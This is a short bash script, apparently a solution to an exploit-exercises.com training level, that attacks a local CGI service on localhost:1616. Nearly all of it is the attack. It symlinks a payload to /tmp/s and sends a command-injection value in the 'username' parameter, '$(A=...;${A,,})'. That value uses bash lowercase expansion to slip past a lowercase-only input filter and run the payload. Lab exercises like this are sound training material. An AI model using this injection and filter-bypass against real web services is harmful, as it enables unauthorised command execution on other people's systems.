#!/bin/bash -eu
# Copyright (c) 2015, Heye Voecking <heye.voecking+exploit-exercises.com@gmail.com>

source $HOME/common/setup-exploit

# Ugly workaround for now, since we're required to only use lowercase chars
SYM=/tmp/s
registerTrap "rm $SYM" EXIT
ln -s $EXPLOIT_SCRIPT $SYM
PREPARED_USER_STRIUNG=$(echo $SYM | sed 's@/@%2F@g')
SERVICE=localhost:1616
if ! wget -qO- $SERVICE'/index.cgi?username=$(A='$PREPARED_USER_STRIUNG'%3B${A,,})' >/dev/null
then
  echo "ERROR: failed to plant exploit!" >&2
  echo "Sometimes the service to be exploited running on $SERVICE crashes." >&2
  echo "Restart the VM and try again." >&2
  false
fi


exploit_with_binary
